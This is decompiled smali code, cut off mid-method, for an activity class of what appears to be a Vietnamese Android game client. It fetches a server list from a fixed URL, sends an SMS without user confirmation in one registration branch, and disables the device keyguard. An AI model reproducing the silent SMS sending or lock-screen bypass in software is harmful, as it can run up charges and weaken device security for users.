.class public Lleo/ma2/v9hp/TerrainMidlet;
.super Landroid/app/Activity;

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field public static a:B

.field public static b:Ljava/lang/String;

.field public static c:Lleo/ma2/v9hp/TerrainMidlet;

.field public static d:Landroid/content/res/AssetManager;

.field public static e:I

.field public static f:Ljava/lang/String;

.field public static g:LZ;

.field public static h:Ljava/util/Vector;

.field public static i:Ljava/lang/String;

.field public static j:Z

.field public static k:I

.field public static l:[Z

.field private static m:Lleo/ma2/v9hp/CCanvas;

.field private static n:Landroid/widget/RelativeLayout;

.field private static o:Landroid/widget/ScrollView;

.field private static p:Landroid/widget/RelativeLayout;

.field private static q:I

.field private static r:Ljava/lang/String;

.field private static s:Ljava/lang/Boolean;

.field private static t:Z

.field private static u:I

.field private static v:Lleo/ma2/v9hp/myEditText;

.field private static x:Ljava/lang/String;

.field private static y:Ljava/net/HttpURLConnection;


# instance fields
.field public w:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    const/4 v1, 0x1

    const/4 v0, 0x0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->d:Landroid/content/res/AssetManager;

    const/16 v0, 0x4acd

    sput v0, Lleo/ma2/v9hp/TerrainMidlet;->e:I

    const-string v0, "27.0.14.69"

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->f:Ljava/lang/String;

    new-instance v0, Ljava/util/Vector;

    invoke-direct {v0}, Ljava/util/Vector;-><init>()V

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->h:Ljava/util/Vector;

    sput v2, Lleo/ma2/v9hp/TerrainMidlet;->q:I

    const-string v0, ""

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->i:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->s:Ljava/lang/Boolean;

    sput-boolean v1, Lleo/ma2/v9hp/TerrainMidlet;->j:Z

    sput-boolean v1, Lleo/ma2/v9hp/TerrainMidlet;->t:Z

    sput v2, Lleo/ma2/v9hp/TerrainMidlet;->u:I

    const/16 v0, 0xa

    new-array v0, v0, [Z

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->l:[Z

    const-string v0, "http://berus.wap.sh/server.txt"

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->x:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lleo/ma2/v9hp/h;

    invoke-direct {v0, p0}, Lleo/ma2/v9hp/h;-><init>(Lleo/ma2/v9hp/TerrainMidlet;)V

    iput-object v0, p0, Lleo/ma2/v9hp/TerrainMidlet;->w:Landroid/os/Handler;

    return-void
.end method

.method private a(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    invoke-static {p1}, Lleo/ma2/v9hp/CCanvas;->a(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0}, Lleo/ma2/v9hp/TerrainMidlet;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v1

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    :try_start_0
    invoke-virtual {v1}, Ljava/io/InputStream;->read()I

    move-result v0

    :goto_0
    const/4 v3, -0x1

    if-ne v0, v3, :cond_0

    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->r:Ljava/lang/String;

    if-eqz v0, :cond_1

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->r:Ljava/lang/String;

    :goto_2
    return-object v0

    :cond_0
    :try_start_1
    invoke-virtual {v2, v0}, Ljava/io/ByteArrayOutputStream;->write(I)V

    invoke-virtual {v1}, Ljava/io/InputStream;->read()I
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    move-result v0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :cond_1
    const-string v0, "0"

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->r:Ljava/lang/String;

    goto :goto_2
.end method

.method public static a()V
    .locals 3

    sget-boolean v0, Lleo/ma2/v9hp/TerrainMidlet;->t:Z

    if-eqz v0, :cond_0

    const-string v0, "vibrate"

    sget-object v1, Lleo/ma2/v9hp/CCanvas;->a:Landroid/app/Activity;

    invoke-static {v0, v1}, Lw;->a(Ljava/lang/String;Landroid/app/Activity;)I

    move-result v0

    if-lez v0, :cond_0

    sget-object v0, Lleo/ma2/v9hp/CCanvas;->b:Landroid/os/Vibrator;

    const-wide/16 v1, 0x64

    invoke-virtual {v0, v1, v2}, Landroid/os/Vibrator;->vibrate(J)V

    :cond_0
    return-void
.end method

.method public static a(Ljava/lang/String;Ljava/lang/String;LI;LI;)V
    .locals 7

    const/4 v2, 0x0

    const/4 v6, 0x6

    const/4 v4, 0x0

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->s:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_1

    sget-boolean v0, Lleo/ma2/v9hp/TerrainMidlet;->j:Z

    if-eqz v0, :cond_0

    sput-boolean v4, Lleo/ma2/v9hp/TerrainMidlet;->j:Z

    const-string v0, "SMS_SENT"

    sget-object v1, Lleo/ma2/v9hp/CCanvas;->c:Landroid/content/Context;

    new-instance v3, Landroid/content/Intent;

    invoke-direct {v3, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {v1, v4, v3, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    sget-object v1, Lleo/ma2/v9hp/CCanvas;->c:Landroid/content/Context;

    new-instance v3, Lleo/ma2/v9hp/i;

    invoke-direct {v3, p2, p3}, Lleo/ma2/v9hp/i;-><init>(LI;LI;)V

    new-instance v5, Landroid/content/IntentFilter;

    invoke-direct {v5, v0}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v3, v5}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    invoke-virtual {p1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    add-int/lit8 v1, v1, -0x6

    invoke-static {v0, v6, v1}, Ljava/lang/String;->copyValueOf([CII)Ljava/lang/String;

    move-result-object v1

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    move-object v3, p0

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    sget-object v0, Lleo/ma2/v9hp/CCanvas;->k:LaV;

    sget-object v1, Lleo/ma2/v9hp/CCanvas;->n:LcM;

    if-ne v0, v1, :cond_2

    invoke-virtual {p1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    add-int/lit8 v1, v1, -0x6

    invoke-static {v0, v6, v1}, Ljava/lang/String;->copyValueOf([CII)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "So\u1ea1n Tin nh\u1eafn: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " g\u1eedi t\u1edbi "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " \u0111\u1ec3 \u0111\u0103ng k\u00fd t\u00e0i kho\u1ea3n!"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lleo/ma2/v9hp/CCanvas;->b(Ljava/lang/String;)V

    goto :goto_0

    :cond_2
    const-string v0, "Vui l\u00f2ng ki\u1ec3m tra l\u1ea1i sim ho\u1eb7c s\u00f3ng m\u1ea1ng!"

    invoke-static {v0}, Lleo/ma2/v9hp/CCanvas;->b(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private static a(Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;
    .locals 6

    const/4 v5, -0x1

    const/4 v0, 0x0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v3

    invoke-virtual {p0, p1, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v1

    move v2, v0

    :goto_0
    if-ne v1, v5, :cond_0

    add-int/lit8 v1, v2, 0x1

    new-array v4, v1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    move v2, v1

    move v1, v0

    :goto_1
    if-ne v2, v5, :cond_1

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    invoke-virtual {p0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v4, v0

    return-object v4

    :cond_0
    add-int/2addr v1, v3

    invoke-virtual {p0, p1, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v1

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    invoke-virtual {p0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v4, v0

    add-int v1, v2, v3

    invoke-virtual {p0, p1, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v2

    add-int/lit8 v0, v0, 0x1

    goto :goto_1
.end method

.method public static b()I
    .locals 1

    sget v0, Lleo/ma2/v9hp/TerrainMidlet;->q:I

    add-int/lit8 v0, v0, 0x1

    sput v0, Lleo/ma2/v9hp/TerrainMidlet;->q:I

    return v0
.end method

.method private static b(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    :try_start_0
    invoke-static {p0}, Lleo/ma2/v9hp/TerrainMidlet;->c(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v2, 0x1000

    new-array v2, v2, [B

    :goto_0
    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I

    move-result v3

    const/4 v4, -0x1

    if-ne v3, v4, :cond_1

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->y:Ljava/net/HttpURLConnection;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_0
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    :goto_1
    return-object v0

    :cond_1
    const/4 v4, 0x0

    invoke-virtual {v1, v2, v4, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v0, 0x0

    goto :goto_1
.end method

.method private static c(Ljava/lang/String;)Ljava/io/InputStream;
    .locals 3

    const/4 v1, 0x0

    :try_start_0
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, p0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    instance-of v2, v0, Ljava/net/HttpURLConnection;

    if-nez v2, :cond_0

    new-instance v0, Ljava/io/IOException;

    const-string v2, "URL is not an Http URL"

    invoke-direct {v0, v2}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v0
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/net/MalformedURLException;->printStackTrace()V

    move-object v0, v1

    :goto_0
    return-object v0

    :cond_0
    :try_start_1
    check-cast v0, Ljava/net/HttpURLConnection;

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->y:Ljava/net/HttpURLConnection;

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setAllowUserInteraction(Z)V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->y:Ljava/net/HttpURLConnection;

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setInstanceFollowRedirects(Z)V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->y:Ljava/net/HttpURLConnection;

    const-string v2, "GET"

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->y:Ljava/net/HttpURLConnection;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->y:Ljava/net/HttpURLConnection;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    const/16 v2, 0xc8

    if-ne v0, v2, :cond_1

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->y:Ljava/net/HttpURLConnection;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    :try_end_1
    .catch Ljava/net/MalformedURLException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v0

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    :cond_1
    move-object v0, v1

    goto :goto_0
.end method

.method public static c()V
    .locals 3

    const/4 v2, 0x0

    sget v0, Lleo/ma2/v9hp/TerrainMidlet;->u:I

    if-eqz v0, :cond_0

    sget v0, Lleo/ma2/v9hp/TerrainMidlet;->u:I

    packed-switch v0, :pswitch_data_0

    :cond_0
    :goto_0
    return-void

    :pswitch_0
    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->p:Landroid/widget/RelativeLayout;

    sget-object v1, Lleo/ma2/v9hp/TerrainMidlet;->v:Lleo/ma2/v9hp/myEditText;

    invoke-virtual {v0, v1}, Landroid/widget/RelativeLayout;->addView(Landroid/view/View;)V

    sput v2, Lleo/ma2/v9hp/TerrainMidlet;->u:I

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->v:Lleo/ma2/v9hp/myEditText;

    invoke-virtual {v0}, Lleo/ma2/v9hp/myEditText;->requestFocus()Z

    sget-object v0, Lleo/ma2/v9hp/CCanvas;->c:Landroid/content/Context;

    const-string v1, "input_method"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/inputmethod/InputMethodManager;

    sget-object v1, Lleo/ma2/v9hp/TerrainMidlet;->v:Lleo/ma2/v9hp/myEditText;

    invoke-virtual {v0, v1, v2}, Landroid/view/inputmethod/InputMethodManager;->showSoftInput(Landroid/view/View;I)Z

    goto :goto_0

    :pswitch_1
    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->p:Landroid/widget/RelativeLayout;

    sget-object v1, Lleo/ma2/v9hp/TerrainMidlet;->v:Lleo/ma2/v9hp/myEditText;

    invoke-virtual {v0, v1}, Landroid/widget/RelativeLayout;->removeView(Landroid/view/View;)V

    sput v2, Lleo/ma2/v9hp/TerrainMidlet;->u:I

    const/4 v0, 0x0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->v:Lleo/ma2/v9hp/myEditText;

    sget-object v0, Lleo/ma2/v9hp/CCanvas;->k:LaV;

    sget-object v1, Lleo/ma2/v9hp/CCanvas;->s:Lea;

    if-ne v0, v1, :cond_1

    sget-object v0, Lleo/ma2/v9hp/CCanvas;->s:Lea;

    invoke-virtual {v0}, Lea;->r()V

    goto :goto_0

    :cond_1
    sget-object v0, Lleo/ma2/v9hp/CCanvas;->k:LaV;

    sget-object v1, Lleo/ma2/v9hp/CCanvas;->m:LbM;

    if-ne v0, v1, :cond_0

    sget-object v0, Lleo/ma2/v9hp/CCanvas;->m:LbM;

    invoke-virtual {v0}, LbM;->l()V

    goto :goto_0

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public static d()V
    .locals 6

    const/4 v1, 0x0

    invoke-static {}, LO;->cW()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lleo/ma2/v9hp/CCanvas;->e(Ljava/lang/String;)V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->x:Ljava/lang/String;

    invoke-static {v0}, Lleo/ma2/v9hp/TerrainMidlet;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    const-string v0, "Kh\u00f4ng th\u1ec3 k\u1ebft n\u1ed1i, xin ki\u1ec3m tra l\u1ea1i GPRS/3G/Wifi."

    invoke-static {v0}, Lleo/ma2/v9hp/CCanvas;->b(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    const-string v2, ","

    invoke-static {v0, v2}, Lleo/ma2/v9hp/TerrainMidlet;->a(Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    array-length v0, v2

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, LeO;->a:[Ljava/lang/String;

    array-length v0, v2

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, LeO;->b:[Ljava/lang/String;

    array-length v0, v2

    new-array v0, v0, [S

    sput-object v0, LeO;->c:[S

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "tema lent= "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    array-length v3, v2

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ly;->c(Ljava/lang/String;)V

    move v0, v1

    :goto_1
    array-length v3, v2

    if-lt v0, v3, :cond_1

    invoke-static {}, Lleo/ma2/v9hp/TerrainMidlet;->e()V

    invoke-static {}, Lleo/ma2/v9hp/CCanvas;->c()V

    goto :goto_0

    :cond_1
    aget-object v3, v2, v0

    const-string v4, ":"

    invoke-static {v3, v4}, Lleo/ma2/v9hp/TerrainMidlet;->a(Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    sget-object v4, LeO;->a:[Ljava/lang/String;

    aget-object v5, v3, v1

    aput-object v5, v4, v0

    sget-object v4, LeO;->b:[Ljava/lang/String;

    const/4 v5, 0x1

    aget-object v5, v3, v5

    aput-object v5, v4, v0

    sget-object v4, LeO;->c:[S

    const/4 v5, 0x2

    aget-object v3, v3, v5

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Short;->parseShort(Ljava/lang/String;)S

    move-result v3

    aput-short v3, v4, v0

    add-int/lit8 v0, v0, 0x1

    goto :goto_1
.end method

.method private static e()V
    .locals 4

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v2, Ljava/io/DataOutputStream;

    invoke-direct {v2, v1}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    :try_start_0
    sget-object v0, LeO;->a:[Ljava/lang/String;

    array-length v0, v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->writeByte(I)V

    const/4 v0, 0x0

    :goto_0
    sget-object v3, LeO;->a:[Ljava/lang/String;

    array-length v3, v3

    if-lt v0, v3, :cond_0

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    const-string v1, "ipArmy2"

    sget-object v3, Lleo/ma2/v9hp/CCanvas;->a:Landroid/app/Activity;

    invoke-static {v0, v1, v3}, Ly;->a([BLjava/lang/String;Landroid/app/Activity;)V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->close()V

    :goto_1
    return-void

    :cond_0
    sget-object v3, LeO;->a:[Ljava/lang/String;

    aget-object v3, v3, v0

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeUTF(Ljava/lang/String;)V

    sget-object v3, LeO;->b:[Ljava/lang/String;

    aget-object v3, v3, v0

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeUTF(Ljava/lang/String;)V

    sget-object v3, LeO;->c:[S

    aget-short v3, v3, v0

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeShort(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method


# virtual methods
.method public final a(ILleo/ma2/v9hp/myEditText;)V
    .locals 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "update edittext"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sput p1, Lleo/ma2/v9hp/TerrainMidlet;->u:I

    sput-object p2, Lleo/ma2/v9hp/TerrainMidlet;->v:Lleo/ma2/v9hp/myEditText;

    new-instance v0, Ljava/lang/Thread;

    invoke-direct {v0, p0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 5

    const/16 v1, 0x400

    const/4 v4, 0x0

    const/4 v3, 0x1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0, v3}, Lleo/ma2/v9hp/TerrainMidlet;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Lleo/ma2/v9hp/TerrainMidlet;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    sput-object p0, Lleo/ma2/v9hp/TerrainMidlet;->c:Lleo/ma2/v9hp/TerrainMidlet;

    invoke-virtual {p0}, Lleo/ma2/v9hp/TerrainMidlet;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->d:Landroid/content/res/AssetManager;

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->m:Lleo/ma2/v9hp/CCanvas;

    if-nez v0, :cond_0

    new-instance v0, Lleo/ma2/v9hp/CCanvas;

    invoke-direct {v0, p0}, Lleo/ma2/v9hp/CCanvas;-><init>(Landroid/content/Context;)V

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->m:Lleo/ma2/v9hp/CCanvas;

    invoke-static {}, Ly;->a()V

    :cond_0
    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->m:Lleo/ma2/v9hp/CCanvas;

    iput-boolean v3, v0, Lleo/ma2/v9hp/CCanvas;->e:Z

    const-string v0, "provider"

    invoke-direct {p0, v0}, Lleo/ma2/v9hp/TerrainMidlet;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    int-to-byte v0, v0

    sput-byte v0, Lleo/ma2/v9hp/TerrainMidlet;->a:B

    const-string v0, "agent"

    invoke-direct {p0, v0}, Lleo/ma2/v9hp/TerrainMidlet;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->b:Ljava/lang/String;

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->i:Ljava/lang/String;

    invoke-static {}, Lai;->b()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1

    :try_start_0
    const-string v1, ":"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    const/4 v2, 0x0

    invoke-virtual {v0, v2, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    sput-object v2, Lleo/ma2/v9hp/TerrainMidlet;->f:Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    sput v0, Lleo/ma2/v9hp/TerrainMidlet;->e:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    invoke-static {}, Lay;->d()Lay;

    invoke-static {}, Lai;->a()Lai;

    move-result-object v0

    invoke-static {v0}, Lay;->a(Lau;)V

    invoke-static {}, LaG;->a()LaG;

    move-result-object v0

    invoke-static {}, Lay;->d()Lay;

    move-result-object v1

    iput-object v1, v0, LaG;->d:Lav;

    invoke-static {}, Lat;->a()Lat;

    move-result-object v0

    invoke-static {}, LaG;->a()LaG;

    move-result-object v1

    iput-object v1, v0, Lat;->a:Law;

    new-instance v0, Landroid/widget/RelativeLayout;

    invoke-direct {v0, p0}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->n:Landroid/widget/RelativeLayout;

    sget-object v1, Lleo/ma2/v9hp/TerrainMidlet;->m:Lleo/ma2/v9hp/CCanvas;

    invoke-virtual {v0, v1}, Landroid/widget/RelativeLayout;->addView(Landroid/view/View;)V

    new-instance v0, Landroid/widget/ScrollView;

    invoke-direct {v0, p0}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->o:Landroid/widget/ScrollView;

    new-instance v0, Landroid/widget/RelativeLayout;

    invoke-direct {v0, p0}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->p:Landroid/widget/RelativeLayout;

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->o:Landroid/widget/ScrollView;

    sget-object v1, Lleo/ma2/v9hp/TerrainMidlet;->p:Landroid/widget/RelativeLayout;

    invoke-virtual {v0, v1}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->n:Landroid/widget/RelativeLayout;

    sget-object v1, Lleo/ma2/v9hp/TerrainMidlet;->o:Landroid/widget/ScrollView;

    invoke-virtual {v0, v1}, Landroid/widget/RelativeLayout;->addView(Landroid/view/View;)V

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->n:Landroid/widget/RelativeLayout;

    invoke-virtual {p0, v0}, Lleo/ma2/v9hp/TerrainMidlet;->setContentView(Landroid/view/View;)V

    const-string v0, "keyguard"

    invoke-virtual {p0, v0}, Lleo/ma2/v9hp/TerrainMidlet;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    const-string v1, "keyguard"

    invoke-virtual {v0, v1}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lleo/ma2/v9hp/TerrainMidlet;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimState()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    :goto_1
    return-void

    :pswitch_0
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->s:Ljava/lang/Boolean;

